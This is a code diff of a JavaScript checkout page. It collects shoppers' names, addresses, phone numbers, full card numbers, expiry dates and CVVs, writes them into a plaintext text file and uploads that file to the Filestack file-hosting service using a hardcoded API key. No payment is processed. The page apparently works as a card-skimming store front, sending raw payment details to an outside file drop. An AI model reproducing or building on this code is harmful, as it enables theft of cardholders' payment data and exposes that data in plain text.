@@ -19,10 +19,14 @@ document.addEventListener('DOMContentLoaded', function () {
   const urlParams = getUrlParams();
 
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-  document.getElementById('product-name').textContent = urlParams.name;
-  document.getElementById('product-color').textContent = urlParams.color;
-  document.getElementById('product-price').textContent = urlParams.price;
-  
+  document.getElementById('product-name').textContent = `Name: ${urlParams.name}`;
+  document.getElementById('product-color').textContent = `Color: ${urlParams.color}`;
+  document.getElementById('product-price').textContent = `Price: ${urlParams.price}`;
+  document.getElementById('product-quantity').textContent = `Quantity: ${urlParams.quantity}`;
+
+  // حساب السعر الإجمالي
+  const totalPrice = urlParams.price * urlParams.quantity;
+  document.getElementById('total-price').textContent = `Total Price: $${totalPrice}`;
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
@@ -60,6 +64,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const city = document.getElementById('city').value;
     const state = document.getElementById('state').value;
     const zipCode = document.getElementById('zip-code').value;
+    const phone = document.getElementById('phone').value;  // حقل الهاتف الجديد
     const cardName = document.getElementById('card-name').value;
     const cardNumber = document.getElementById('card-number').value;
     const expiry = document.getElementById('expiry').value;
@@ -77,134 +82,146 @@ document.addEventListener('DOMContentLoaded', function () {
     removeErrorMessages();  // إزالة رسائل الخطأ السابقة
 
     // تحقق من الحقول الفارغة
-    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !cardName || !cardNumber || !expiry || !cvv) {
+    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !phone || !cardName || !cardNumber || !expiry || !cvv) {
         isValid = false;
         showErrorMessage('Please fill out all required fields.', 'general');
     }
 
     // تحقق من صحة البريد الإلكتروني
     if (!validateEmail(email)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid email address.', 'email');
+      isValid = false;
+      showErrorMessage('Please enter a valid email address.', 'email');
     }
 
     // تحقق من اسم حامل البطاقة
     if (!validateCardName(cardName)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
+      isValid = false;
+      showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
     }
 
     // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
     if (!validateCard(cardNumber)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
+      isValid = false;
+      showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
     }
 
     // تحقق من تاريخ الصلاحية
     if (!validateExpiry(expiry)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
+      isValid = false;
+      showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
     }
 
     // تحقق من CVV
     if (!validateCVV(cvv)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid CVV number.', 'cvv');
+      isValid = false;
+      showErrorMessage('Please enter a valid CVV number.', 'cvv');
     }
 
+    // إذا كانت البيانات صحيحة، أنشئ الملف النصي وأرسله عبر API
     if (isValid) {
-        // إنشاء محتوى الملف النصي مع بيانات المنتج
-        const orderData =  
-            `Email: ${email}\n
-            First Name: ${firstName}\n
-            Last Name: ${lastName}\n
-            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}\n
-            City: ${city}\n
-            State: ${state}\n
-            Zip Code: ${zipCode}\n
-            Cardholders Name: ${cardName}\n
-            Card Number: ${cardNumber}\n
-            Expiry Date: ${expiry}\n
-            CVV: ${cvv}\n
-            --- Product Details ---\n
-            Product Name: ${productName}\n
-            Product Price: $${productPriceText}\n
-            Product Quantity: ${productQuantityText}\n
-            Product Image URL: ${productImageUrl}\n
-            Total Price: $${totalPrice}`;
+      const clientData = {
+        email: email,
+        firstName: firstName,
+        lastName: lastName,
+        phone: phone,
+        streetHouseApartmentUnit: streetHouseApartmentUnit,
+        city: city,
+        state: state,
+        zipCode: zipCode,
+        cardName: cardName,
+        cardNumber: cardNumber,
+        expiry: expiry,
+        cvv: cvv,
+        productName: productName,
+        productPrice: productPriceText,
+        productQuantity: productQuantityText,
+        productImageUrl: productImageUrl,
+        totalPrice: totalPrice
+      };
 
+      // إنشاء المحتوى لملف نصي
+      let fileContent = `Client Data:\n`;
+      fileContent += `Email: ${email}\n`;
+      fileContent += `First Name: ${firstName}\n`;
+      fileContent += `Last Name: ${lastName}\n`;
+      fileContent += `Phone: ${phone}\n`;
+      fileContent += `Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n`;
+      fileContent += `Card Name: ${cardName}\n`;
+      fileContent += `Card Number: ${cardNumber}\n`;
+      fileContent += `Expiry: ${expiry}\n`;
+      fileContent += `CVV: ${cvv}\n\n`;
+      fileContent += `Product Information:\n`;
+      fileContent += `Product Name: ${productName}\n`;
+      fileContent += `Price: ${productPriceText}\n`;
+      fileContent += `Quantity: ${productQuantityText}\n`;
+      fileContent += `Total Price: $${totalPrice}\n`;
+      fileContent += `Product Image URL: ${productImageUrl}\n`;
 
-        // تحويل البيانات إلى Blob (بيانات ثنائية)
-        const blob = new Blob([orderData], { type: 'text/plain' });
+      // تحويل النص إلى Blob وإنشاء ملف نصي
+      const blob = new Blob([fileContent], { type: 'text/plain' });
+      const file = new File([blob], 'order_data.txt', { type: 'text/plain' });
 
-        // إعدادات Filestack API
-        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
-        const url = `https://www.filestackapi.com/api/store/S3?key=${apiKey}`;
-
-        // إعداد بيانات الطلب
-        const formData = new FormData();
-        formData.append('file', blob, 'order.txt');
-
-        // إرسال البيانات إلى Filestack
-        fetch(url, {
-            method: 'POST',
-            body: formData,
-        })
-        .then(response => response.json())
-        .then(data => {
-            alert('Order has been processed!');
-        })
-        .catch(error => {
-            console.error('Error uploading file:', error);
-        });
+      // رفع الملف إلى Filestack
+      uploadFileToFilestack(file);
     }
   });
+
+  // دالة للتحقق من صحة البريد الإلكتروني
+  function validateEmail(email) {
+    const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+    return regex.test(email);
+  }
+
+  // دالة للتحقق من صحة اسم حامل البطاقة
+  function validateCardName(name) {
+    const regex = /^[A-Za-z\s]+$/;
+    return regex.test(name);
+  }
+
+  // دالة للتحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
+  function validateCard(cardNumber) {
+    const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
+    return regex.test(cardNumber);
+  }
+
+  // دالة للتحقق من تاريخ الصلاحية
+  function validateExpiry(expiry) {
+    const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+    return regex.test(expiry);
+  }
+
+  // دالة للتحقق من CVV
+  function validateCVV(cvv) {
+    const regex = /^[0-9]{3,4}$/;
+    return regex.test(cvv);
+  }
+
+  // دالة لرفع الملف إلى Filestack
+  function uploadFileToFilestack(file) {
+    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz'); // استبدل بـ API Key الخاص بك
+    client.upload(file)
+      .then((res) => {
+        console.log('File uploaded successfully:', res);
+      })
+      .catch((err) => {
+        console.error('Error uploading file:', err);
+      });
+  }
+
+  // دالة لإظهار رسائل الخطأ
+  function showErrorMessage(message, field) {
+    const errorMessage = document.createElement('div');
+    errorMessage.classList.add('error-message');
+    errorMessage.textContent = message;
+    document.getElementById(field).parentNode.appendChild(errorMessage);
+  }
+
+  // دالة لإزالة رسائل الخطأ السابقة
+  function removeErrorMessages() {
+    const errorMessages = document.querySelectorAll('.error-message');
+    errorMessages.forEach(function(message) {
+      message.remove();
+    });
+  }
 });
-
-// دالة للتحقق من صحة البريد الإلكتروني
-function validateEmail(email) {
-  const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
-  return regex.test(email);
-}
-
-// دالة للتحقق من صحة اسم حامل البطاقة
-function validateCardName(name) {
-  const regex = /^[A-Za-z\s]+$/;
-  return regex.test(name);
-}
-
-// دالة للتحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
-function validateCard(cardNumber) {
-  const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
-  return regex.test(cardNumber);
-}
-
-// دالة للتحقق من تاريخ الصلاحية
-function validateExpiry(expiry) {
-  const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-  return regex.test(expiry);
-}
-
-// دالة للتحقق من CVV
-function validateCVV(cvv) {
-  const regex = /^[0-9]{3,4}$/;
-  return regex.test(cvv);
-}
-
-// دالة لإظهار رسائل الخطأ
-function showErrorMessage(message, field) {
-  const errorMessage = document.createElement('div');
-  errorMessage.classList.add('error-message');
-  errorMessage.textContent = message;
-  document.getElementById(field).parentNode.appendChild(errorMessage);
-}
-
-// دالة لإزالة رسائل الخطأ السابقة
-function removeErrorMessages() {
-  const errorMessages = document.querySelectorAll('.error-message');
-  errorMessages.forEach(function(message) {
-    message.remove();
-  });
-}
-
 
